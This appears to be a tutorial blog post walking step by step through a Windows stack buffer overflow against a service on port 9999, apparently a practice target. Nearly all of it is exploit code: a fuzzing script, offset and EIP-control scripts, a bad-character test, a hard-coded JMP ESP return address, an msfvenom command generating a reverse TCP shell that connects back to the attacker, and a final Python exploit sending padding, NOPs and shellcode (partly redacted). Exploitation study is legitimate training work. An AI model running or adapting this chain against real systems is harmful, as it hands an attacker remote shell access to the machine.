---
layout: post
title:  "bof - windows"
date:   2022-01-01
categories: web
---

## Windows - BOF

### Fuzzing

```python

import sys, socket
import time

buffer = "A" * 100

while True:

 try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('127.0.0.1',9999))
     s.recv(1024)
     buffer = buffer + "A" * 100
     s.send(buffer.encode('utf-8'))
     s.close()
     time.sleep(1)
     print("Fuzzing passed %s bytes" % str(len(buffer)))

 except Exception as ex:

        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        print(ex)
        sys.exit()

```


### Offset

```bash

msf-pattern_create -l 600 -s ABCDEFGHIKL,aves,123456789
Aa1Aa2<REMOVED>Dl1Dl2

```


```python

import socket,sys

#msf-pattern_create -l 600 -s ABCDEFGHIKL,aves,123456789
payload = "Aa1Aa2<REMOVED>Dl1Dl2"


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8'))
    s.close()
except Exception as e:
    print("[X] Connection error")
    print(e)
    sys.exit()

```

## For example : EIP Overrided with value : 35754334

### Exact offset is 524

```bash

msf-pattern_offset -l 600 -s ABCDEFGHIKL,aves,123456789 -q 35754334
[*] Exact match at offset 524
```

### Control EIP

```python

import socket,sys

#Identify the EIP control
#EIP SHOULD BE 42424242 = BBBB
payload = "A" * 524 + "B" * 4

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8'))
    s.close()
except Exception as ex:
    print("[X] Connection error")
    print(ex)
    sys.exit()

```


### Badchars

We are lucky there aren’t badchars
By default \x00 is badchar so we excluded from the list


```python

import socket,sys

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buffer= "A" * 524 + "B" * 4 + badchars

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(buffer.encode('utf-8'))
    s.close()
except Exception as ex:
    print(ex)
    print("[X] Connection error")
    sys.exit()

```

```

We don’t need to give to the EIP the exact address of our malicious shellcode. The instruction JMP ESP will jump to the stack pointer and execute our malicious shellcode. So, If we can find the JMP ESP instruction in the program, we can give its memory address to the EIP and it will jump to automatically to our malicious shellcode.

```

Immunity Debugger -> Search for -> All commands -> JMP ESP

```

The address of the JMP ESP is : 311712F3 or in little endian : \xF3\x12\x17\x31

```

### JMP ESP - Call Confirmation

```python

import socket,sys

#Identify that the EIP call the 'JMP ESP's instruction address
payload = "A" * 524
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload.encode('utf-8')+b'\xF3\x12\x17\x31')
    s.close()
except Exception as ex:
    print(ex)
    print("[X] Connection error")
    sys.exit()

```

### Reverse Shell Generator


```bash

msfvenom -p windows/shell_reverse_tcp LHOST=<MY IP> LPORT=4444 -f python -a x86 -b '\x00'

```

## Reverse Shell

```python

import socket,sys



#msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=4444 -f python -a x86 -b '\x00'

buf =  b""
buf += b"\xbb\x4c\x6c\xb3\x79\xd9\xeb\xd9\x74\x24\xf4\x5a\x33"
# redacted
buf += b"\xec\x7b\x48\xa8\xaa\x90\x20\xa1\x5e\x96\x97\xc2\x4a"


payload = "A"*524
payload = payload + "\xF3\x12\x17\x31"
nop = 20*"\x90"
payload = payload + nop + buf

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.0.2.254',9999))
    s.recv(1024)
    s.send(payload)
    s.close()
except Exception as ex:  
    print ex
    print "[X] Connection error"
    sys.exit()

```